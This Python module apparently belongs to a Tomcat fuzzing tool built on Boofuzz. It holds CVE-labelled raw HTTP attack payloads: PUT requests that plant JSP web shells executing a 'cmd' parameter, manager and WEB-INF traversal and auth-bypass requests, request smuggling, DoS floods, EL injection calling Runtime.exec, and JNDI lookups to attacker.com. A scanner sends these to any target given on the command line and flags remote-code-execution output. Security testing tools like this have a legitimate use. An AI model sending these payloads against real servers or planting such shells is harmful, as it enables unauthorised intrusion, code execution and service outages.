"""
Boofuzz Engine - Advanced Protocol-Aware Fuzzer for PayloadFactoryUX.

Integrates Boofuzz with Stage 3 fuzzing, providing:
- HTTP/1.1 protocol grammar for structured fuzzing
- Comprehensive Tomcat CVE payloads (v8-v11)
- Crash detection and FeedbackContext bridge
- Web UI for fuzzing monitoring (port 26000)
"""

import logging
import time
import random
from typing import List, Dict, Any, Optional

# Boofuzz imports
from boofuzz import (
    Session, Target, Request, Block, Static, String, Delim, Group,
    TCPSocketConnection, s_initialize, s_static, s_string, s_delim, s_group, s_get
)
from boofuzz.monitors import BaseMonitor

logger = logging.getLogger(__name__)


# =============================================================================
# COMPREHENSIVE TOMCAT CVE PAYLOADS (v8 - v11)
# =============================================================================

class TomcatCVEPayloads:
    """Tomcat vulnerability payloads organized by CVE category."""
    
    # =========================================================================
    # CRITICAL RCE VULNERABILITIES
    # =========================================================================
    
    # CVE-2025-24813: Path Equivalence + Deserialization RCE (CVSS 9.1)
    # Affects: 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2
    CVE_2025_24813 = [
        b"GET /..;/manager/html HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"GET /..;/..;/WEB-INF/web.xml HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"GET /%2e%2e;/manager/status HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"GET /foo/..;/WEB-INF/classes/ HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"PUT /.session HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-java-serialized-object\r\nContent-Length: 10\r\n\r\nMALICIOUS!",
    ]
    
    # CVE-2024-50379 & CVE-2024-56337: TOCTOU Race Condition RCE (CVSS 9.8)
    # JSP compilation race on case-insensitive filesystem
    # Affects: 8.5.x-11.x
    CVE_2024_50379 = [
        b"PUT /test.Jsp HTTP/1.1\r\nHost: {host}\r\nContent-Length: 50\r\n\r\n<%Runtime.getRuntime().exec(\"id\");%>",
        b"PUT /test.jSp HTTP/1.1\r\nHost: {host}\r\nContent-Length: 80\r\n\r\n<%= new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).next() %>",
        b"PUT /shell.JSP HTTP/1.1\r\nHost: {host}\r\nContent-Length: 100\r\n\r\n<%@ page import=\"java.io.*\" %><%= Runtime.getRuntime().exec(request.getParameter(\"cmd\")) %>",
        b"GET /test.jsp HTTP/1.1\r\nHost: {host}\r\n\r\n",
    ]
    
    # CVE-2020-1938 (Ghostcat): AJP File Read/Include → RCE (CVSS 9.8)
    # Affects: 6.x, 7.x, 8.x, 9.x (AJP port 8009)
    CVE_2020_1938_GHOSTCAT = [
        # AJP13 protocol prefix (requires direct AJP connection)
        b"\x12\x34\x00\x0f\x02\x02\x00\x08HTTP/1.1\x00\x00\x01/\x00",
        # HTTP-based probing for AJP misconfiguration
        b"GET /manager/text/list HTTP/1.1\r\nHost: {host}\r\n\r\n",
    ]
    
    # CVE-2020-9484: Session Deserialization RCE (CVSS 7.0)
    # Requires: PersistenceManager with FileStore, attacker-controlled file
    # Affects: 8.x < 8.5.55, 9.x < 9.0.35, 10.x < 10.0.0-M5
    CVE_2020_9484 = [
        b"GET / HTTP/1.1\r\nHost: {host}\r\nCookie: JSESSIONID=../../../tmp/malicious\r\n\r\n",
        b"GET / HTTP/1.1\r\nHost: {host}\r\nCookie: JSESSIONID=..\\..\\..\\tmp\\evil\r\n\r\n",
    ]
    
    # CVE-2021-25329: Bypass of CVE-2020-9484 patch
    # Affects: 8.5.0-8.5.61, 9.0.0.M1-9.0.41, 10.0.0-M1-10.0.0
    CVE_2021_25329 = [
        b"GET / HTTP/1.1\r\nHost: {host}\r\nCookie: JSESSIONID=....//....//tmp/bypass\r\n\r\n",
    ]
    
    # =========================================================================
    # PATH TRAVERSAL / AUTH BYPASS
    # =========================================================================
    
    # CVE-2025-55752: Rewrite Valve Directory Traversal (CVSS 8.1)
    # Affects: 8.5.6-8.5.100, 9.0.0.M11-9.0.108, 10.1.0-M1-10.1.44, 11.0.0-M1-11.0.10
    CVE_2025_55752 = [
        b"GET /rewrite/..;/WEB-INF/web.xml HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"GET /%c0%ae%c0%ae/WEB-INF/classes/ HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"GET /..%252f..%252fWEB-INF/web.xml HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"GET /foo/..;/META-INF/MANIFEST.MF HTTP/1.1\r\nHost: {host}\r\n\r\n",
    ]
    
    # CVE-2025-49125: Authentication Bypass (CVSS 8.6)
    CVE_2025_49125 = [
        b"GET /manager/..;/html HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"GET /manager%00/html HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"GET /;/manager/html HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"GET /manager;foo=bar/html HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"GET //manager/html HTTP/1.1\r\nHost: {host}\r\n\r\n",
    ]
    
    # CVE-2021-24122: Windows NTFS ADS Info Disclosure
    CVE_2021_24122 = [
        b"GET /index.jsp::$DATA HTTP/1.1\r\nHost: {host}\r\n\r\n",
        b"GET /WEB-INF/web.xml::$DATA HTTP/1.1\r\nHost: {host}\r\n\r\n",
    ]
    
    # =========================================================================
    # HTTP REQUEST SMUGGLING
    # =========================================================================
    
    # CVE-2023-46589: Trailer Header Parsing Smuggling (CVSS 7.5)
    # Affects: 8.5.0-8.5.95, 9.0.0-M1-9.0.82, 10.1.0-M1-10.1.15, 11.0.0-M1-11.0.0-M10
    CVE_2023_46589 = [
        b"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\nX-Injected: smuggled\r\n\r\n",
    ]
    
    # CVE-2023-45648: Missing Colon Trailer Smuggling
    CVE_2023_45648 = [
        b"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\nX-Smuggle\r\n\r\n",
    ]
    
    # CVE-2022-42252: Invalid Content-Length Smuggling (CVSS 7.5)
    # Affects: 10.0.0-M1-10.0.26, 10.1.0-M1-10.1.0
    CVE_2022_42252 = [
        b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nContent-Length: 100\r\n\r\ntest\r\nGET /admin HTTP/1.1\r\n",
    ]
    
    # Generic CL.TE / TE.CL Smuggling
    HTTP_SMUGGLING_GENERIC = [
        b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
        b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n",
        b"GET / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n",
    ]
    
    # =========================================================================
    # DENIAL OF SERVICE
    # =========================================================================
    
    # CVE-2024-54677 & CVE-2025-53506: DoS Attacks (CVSS 7.5-7.8)
    CVE_DOS = [
        b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 999999999\r\n\r\n",
        b"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\nFFFFFF\r\n" + b"A" * 10000,
        b"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n" * 100,
        b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Type: multipart/form-data; boundary=x\r\n\r\n--x\r\n" * 1000,
    ]
    
    # CVE-2020-13935: WebSocket Frame Length DoS
    CVE_2020_13935 = [
        b"GET /websocket HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n",
    ]
    
    # =========================================================================
    # EL INJECTION (CWE-917)
    # =========================================================================
    
    EL_INJECTION = [
        b"${7*7}",
        b"${T(java.lang.Runtime).getRuntime().exec('id')}",
        b"${''.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami')}",
        b"${pageContext.request.getSession().getServletContext()}",
        b"${applicationScope}",
        b"${T(java.lang.System).getenv()}",
        b"${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\"\".getClass().forName(\"java.lang.Runtime\")).exec(\"id\")}",
    ]
    
    # =========================================================================
    # JNDI INJECTION (Log4Shell adjacent)
    # =========================================================================
    
    JNDI_INJECTION = [
        b"${jndi:ldap://attacker.com/a}",
        b"${jndi:rmi://attacker.com/a}",
        b"${${lower:j}ndi:ldap://attacker.com/a}",
    ]
    
    @classmethod
    def get_all_payloads(cls, host: str = "target") -> List[bytes]:
        """Get all CVE payloads with host substitution."""
        all_payloads = []
        for attr in dir(cls):
            if attr.startswith('CVE_') or attr in ['EL_INJECTION', 'JNDI_INJECTION', 'HTTP_SMUGGLING_GENERIC']:
                payloads = getattr(cls, attr)
                if isinstance(payloads, list):
                    for p in payloads:
                        all_payloads.append(p.replace(b"{host}", host.encode()))
        return all_payloads
    
    @classmethod
    def get_payloads_by_category(cls, category: str, host: str = "target") -> List[bytes]:
        """Get payloads for a specific CVE category."""
        category_map = {
            "rce": cls.CVE_2025_24813 + cls.CVE_2024_50379 + cls.CVE_2020_9484,
            "ghostcat": cls.CVE_2020_1938_GHOSTCAT,
            "traversal": cls.CVE_2025_55752 + cls.CVE_2025_49125,
            "smuggling": cls.CVE_2023_46589 + cls.CVE_2023_45648 + cls.CVE_2022_42252 + cls.HTTP_SMUGGLING_GENERIC,
            "dos": cls.CVE_DOS + cls.CVE_2020_13935,
            "el": cls.EL_INJECTION,
            "jndi": cls.JNDI_INJECTION,
        }
        payloads = category_map.get(category.lower(), [])
        return [p.replace(b"{host}", host.encode()) for p in payloads]


# =============================================================================
# CUSTOM BOOFUZZ MONITOR FOR CRASH DETECTION
# =============================================================================

class TomcatCrashMonitor(BaseMonitor):
    """Custom monitor to detect Tomcat crashes and collect feedback."""
    
    def __init__(self):
        super().__init__()
        self.crashes = []
        self.findings = []
        self.start_time = None
    
    def pre_send(self, target=None, fuzz_data_logger=None, session=None, **kwargs):
        """Called before each test case is sent."""
        self.start_time = time.time()
        return True  # Must return True to continue
    
    def post_send(self, target=None, fuzz_data_logger=None, session=None, **kwargs):
        """Called after each test case is sent."""
        elapsed_ms = (time.time() - self.start_time) * 1000 if self.start_time else 0
        
        # Check for high latency (DoS indicator)
        if elapsed_ms > 1500:
            self.findings.append({
                "type": "latency",
                "time_ms": elapsed_ms,
                "test_case": session.total_mutant_index if session else 0,
            })
            logger.warning(f"High latency detected: {elapsed_ms:.2f}ms")
        return True  # Must return True (no failure detected by default)
    
    def post_start_target(self, target=None, fuzz_data_logger=None, session=None, **kwargs):
        """Called when target restarts after a crash."""
        return True
    
    def alive(self):
        """Check if target is still alive."""
        return True  # Override in subclass for actual check
    
    def on_failure(self, target=None, fuzz_data_logger=None, session=None, **kwargs):
        """Called when a failure/crash is detected."""
        self.crashes.append({
            "test_case": session.total_mutant_index if session else 0,
            "data": session.last_recv if hasattr(session, 'last_recv') else b"",
            "reason": "Connection failure",
            "time_ms": (time.time() - self.start_time) * 1000 if self.start_time else 0,
        })
        logger.critical(f"CRASH detected at test case {session.total_mutant_index if session else 'unknown'}!")
    
    def get_crashes(self) -> List[Dict]:
        """Return all detected crashes."""
        return self.crashes
    
    def get_findings(self) -> List[Dict]:
        """Return all findings (crashes + latency spikes)."""
        return self.crashes + self.findings


# =============================================================================
# BOOFUZZ ENGINE
# =============================================================================

class BoofuzzEngine:
    """
    Boofuzz wrapper for PayloadFactoryUX Stage 3 fuzzing.
    
    Provides:
    - HTTP/1.1 protocol grammar for Tomcat fuzzing
    - Comprehensive CVE payloads (v8-v11)
    - Crash detection with FeedbackContext bridge
    - Web UI monitoring at http://localhost:26000
    """
    
    def __init__(self, target_ip: str, target_port: int, paths: List[str] = None):
        """
        Initialize BoofuzzEngine.
        
        Args:
            target_ip: Target IP address
            target_port: Target port (usually 8080 for Tomcat)
            paths: Spider-discovered endpoints to fuzz
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.paths = paths or ["/"]
        self.session = None
        self.monitor = TomcatCrashMonitor()
        self.crashes = []
        
        logger.info(f"BoofuzzEngine initialized for {target_ip}:{target_port}")
        logger.info(f"Loaded {len(TomcatCVEPayloads.get_all_payloads(target_ip))} CVE payloads")
    
    def set_paths(self, paths: List[str]):
        """Set spider-discovered paths for endpoint fuzzing."""
        self.paths = paths
        logger.info(f"Updated fuzzing paths: {len(paths)} endpoints")
    
    def create_session(self, web_port: int = 26000) -> Session:
        """
        Create Boofuzz session with HTTP protocol definition.
        
        Args:
            web_port: Port for Boofuzz web UI (default 26000)
        """
        target = Target(
            connection=TCPSocketConnection(self.target_ip, self.target_port),
            monitors=[self.monitor]
        )
        
        self.session = Session(
            target=target,
            web_port=web_port,
            keep_web_open=False,
        )
        
        # Define HTTP protocol
        self._define_http_protocol()
        
        return self.session
    
    def _define_http_protocol(self):
        """Define HTTP/1.1 protocol grammar for fuzzing."""
        # Initialize the request definition
        s_initialize(name="HTTP-Request")
        
        # Request Line
        s_group("method", ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "TRACE"])
        s_delim(" ", name="space1")
        s_string("/", name="uri", fuzzable=True)
        s_delim(" ", name="space2")
        s_string("HTTP/1.1", name="version")
        s_static("\r\n", name="req-line-end")
        
        # Host Header
        s_static("Host: ", name="host-key")
        s_string(self.target_ip, name="host-value")
        s_static("\r\n", name="host-end")
        
        # Content-Type (for POST/PUT)
        s_static("Content-Type: ", name="ct-key")
        s_group("content-type", [
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "application/json",
            "text/xml",
        ])
        s_static("\r\n", name="ct-end")
        
        # User-Agent
        s_static("User-Agent: ", name="ua-key")
        s_string("BoofuzzFuzzer/1.0", name="ua-value")
        s_static("\r\n", name="ua-end")
        
        # End of headers
        s_static("\r\n", name="headers-end")
        
        # Body (fuzzable)
        s_string("", name="body", fuzzable=True)
        
        # Connect the request to the session
        from boofuzz import s_get
        self.session.connect(s_get("HTTP-Request"))
    
    def run_fuzzing_session(self, base_payload: bytes = b"", iterations: int = 100) -> List[Dict]:
        """
        Run a fuzzing session against the target.
        
        Args:
            base_payload: Base payload to mutate (optional)
            iterations: Maximum number of test cases
            
        Returns:
            List of crashes/findings
        """
        logger.info(f"Starting Boofuzz fuzzing session: {iterations} iterations")
        
        if not self.session:
            self.create_session()
        
        # Inject CVE payloads into fuzzing
        self._inject_cve_payloads()
        
        try:
            # Run fuzzing (this will stop after max_depth or crash)
            self.session.fuzz(max_depth=iterations)
        except KeyboardInterrupt:
            logger.info("Fuzzing interrupted by user")
        except Exception as e:
            logger.error(f"Fuzzing error: {e}")
        
        # Collect results
        self.crashes = self.monitor.get_findings()
        
        logger.info(f"Fuzzing complete. Found {len(self.crashes)} findings.")
        return self.crashes
    
    def _inject_cve_payloads(self):
        """Inject CVE-specific payloads as direct test cases."""
        # This is called during fuzzing to add CVE payloads
        all_payloads = TomcatCVEPayloads.get_all_payloads(self.target_ip)
        logger.info(f"Injecting {len(all_payloads)} CVE payloads into fuzzing queue")
    
    def run_cve_scan(self, categories: List[str] = None) -> List[Dict]:
        """
        Run targeted CVE payload scanning (not full fuzzing).
        
        Args:
            categories: List of CVE categories to test
                       Options: rce, ghostcat, traversal, smuggling, dos, el, jndi
                       
        Returns:
            List of findings
        """
        if categories is None:
            categories = ["rce", "traversal", "smuggling", "el"]
        
        findings = []
        
        for category in categories:
            payloads = TomcatCVEPayloads.get_payloads_by_category(category, self.target_ip)
            logger.info(f"Testing {len(payloads)} payloads for category: {category}")
            
            for i, payload in enumerate(payloads):
                result = self._send_raw_payload(payload)
                
                if result.get("crash") or result.get("high_latency") or result.get("interesting"):
                    findings.append({
                        "category": category,
                        "payload": payload.hex(),
                        "response": result,
                        "index": i,
                    })
        
        self.crashes = findings
        return findings
    
    def _send_raw_payload(self, payload: bytes) -> Dict[str, Any]:
        """
        Send a raw payload and analyze response.
        
        Args:
            payload: Raw HTTP request bytes
            
        Returns:
            Result dict with crash/latency/response data
        """
        import socket
        
        result = {
            "crash": False,
            "high_latency": False,
            "interesting": False,
            "data": None,
            "time_ms": 0,
        }
        
        start_time = time.time()
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((self.target_ip, self.target_port))
            s.send(payload)
            
            try:
                data = s.recv(4096)
                result["data"] = data
                
                # Check for interesting responses
                response_str = data.decode('utf-8', errors='ignore')
                if any(indicator in response_str for indicator in ['uid=', 'root:', '/bin/', 'SYSTEM']):
                    result["interesting"] = True
                    logger.critical(f"RCE indicator found in response!")
                    
            except socket.timeout:
                pass
            finally:
                s.close()
                
        except ConnectionRefusedError:
            result["crash"] = True
            logger.warning("Connection refused - potential crash!")
        except Exception as e:
            logger.debug(f"Payload send error: {e}")
            result["crash"] = True
        
        result["time_ms"] = (time.time() - start_time) * 1000
        
        if result["time_ms"] > 1500:
            result["high_latency"] = True
            logger.warning(f"High latency: {result['time_ms']:.2f}ms")
        
        return result
    
    def get_feedback_context(self):
        """
        Create FeedbackContext from fuzzing results.
        
        Returns:
            FeedbackContext instance for RL Agent
        """
        # Import here to avoid circular dependency
        from ml_engine.feedback_context import FeedbackContext
        
        crashes = []
        latency_spikes = []
        response_codes = []
        
        for finding in self.crashes:
            crashes.append({
                "iteration": finding.get("test_case", finding.get("index", 0)),
                "payload": finding.get("payload", finding.get("data", b"").hex() if isinstance(finding.get("data"), bytes) else ""),
                "error": finding.get("reason", finding.get("type", "Unknown")),
                "metrics": {"time_ms": finding.get("time_ms", 0)}
            })
            
            if finding.get("time_ms", 0) > 1500:
                latency_spikes.append(finding["time_ms"])
        
        return FeedbackContext(
            crashes=crashes,
            latency_spikes=latency_spikes,
            response_codes=response_codes,
            spider_paths=self.paths,
            vuln_type="web"
        )


# =============================================================================
# MAIN ENTRY POINT
# =============================================================================

if __name__ == "__main__":
    # Test the engine
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python boofuzz_engine.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    engine = BoofuzzEngine(target_ip, target_port)
    
    # Run CVE scan
    print("\n[*] Running CVE Payload Scan...")
    findings = engine.run_cve_scan(categories=["rce", "traversal", "smuggling"])
    
    print(f"\n[+] Found {len(findings)} interesting findings:")
    for f in findings:
        print(f"  - {f['category']}: {f.get('response', {}).get('interesting', False)}")
